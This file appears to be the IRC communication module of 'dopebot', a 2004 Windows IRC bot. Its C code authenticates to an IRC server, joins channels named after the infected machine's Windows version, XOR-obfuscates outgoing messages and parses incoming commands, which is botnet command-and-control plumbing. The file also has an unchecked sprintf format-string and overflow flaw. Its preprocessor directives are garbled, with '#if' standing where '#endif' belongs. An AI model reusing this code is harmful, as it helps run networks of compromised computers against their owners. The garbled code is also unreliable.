/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "..\bot.h"

//Send ACTION To IRC Server
void irc_action(SOCKET bsock, char *szAction, char *szParameter)
{
	char szBuffer[IRCBUF];
	if (!szAction || !szParameter) return;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Sending irc action, irc_action()...\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		sprintf(szBuffer, "%s %s\r\n", szAction, szParameter);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Close And Cleanup Socket
void irc_disconnect(SOCKET bsock, WSAEVENT event)
{

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Disconnecting from irc, irc_disconnect()...\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		shutdown(bsock, SD_BOTH);
		closesocket(bsock);
		WSACloseEvent(event);
//		WSACleanup();
		return;
}

//JOIN Channel
void irc_join(SOCKET bsock, char *szChannel, char *szChannelPassword, bool bOSChannel)
{
	char szChan[32], szBuffer[IRCBUF];

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Joining irc channel, irc_join()...\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		memset(szChan, 0, sizeof(szChan));
	if (bOSChannel)
	{
			get_os(szBuffer);
		if (strstr(szBuffer, "Windows 95") != NULL) sprintf(szChan, "#win95");
		else if (strstr(szBuffer, "Windows 98") != NULL) sprintf(szChan, "#win98");
		else if (strstr(szBuffer, "Windows ME") != NULL) sprintf(szChan, "#winme");
		else if (strstr(szBuffer, "Windows NT") != NULL) sprintf(szChan, "#winnt");
		else if (strstr(szBuffer, "Windows 2000") != NULL) sprintf(szChan, "#win2k");
		else if (strstr(szBuffer, "Windows XP") != NULL) sprintf(szChan, "#winxp");
		else if (strstr(szBuffer, "Windows 2003") != NULL) sprintf(szChan, "#win2k3");
	}
	else sprintf(szChan, szChannel);
		sprintf(szBuffer, "JOIN %s %s\r\n", szChan, szChannelPassword);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Send MSG To IRC Server
void irc_msg(SOCKET bsock, char *szAction, char *szDestination, char *szMessage)
{
	char szBuffer[IRCBUF];
	if (!szAction || !szDestination || !szMessage) return;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Sending irc message, irc_msg()...\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_CRYPTO
		xor(szMessage, xorkey);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		sprintf(szBuffer, "%s %s :%s\r\n", szAction, szDestination, szMessage);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Bot Info
void irc_userinfo(SOCKET bsock, char *szBotNick, char *szServer, char *szServerPassword)
{
	char szBuffer[IRCBUF];

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Sending info to ircd, irc_userinfo()...\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		sprintf(szBuffer, "PASS %s\r\n", szServerPassword);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		Sleep(100);
		sprintf(szBuffer, "NICK %s\r\n", szBotNick);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		Sleep(100);
		sprintf(szBuffer, "USER %s \"%s.com\" \"%s\" :%s\r\n", szBotNick, szBotNick, szServer, szBotNick);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Split Buffer
void line_parse(SOCKET bsock, WSAEVENT event, char *szBuffer)
{
	int i, length;
		length = strlen(szBuffer);
	for (i = 0; i < length; i++) 
	{
		if ((szBuffer[i] == '\r') || (szBuffer[i] == '\n')) 
		{
				szBuffer[i] = 0;
		}
	}
	while (szBuffer[0] != 0)
	{

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
			printf("%s\n", szBuffer);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
			
			irc_parse(bsock, event, szBuffer);
			length = strlen(szBuffer) + 2;
			szBuffer += length;
			Sleep(10);
	}
		return;
}
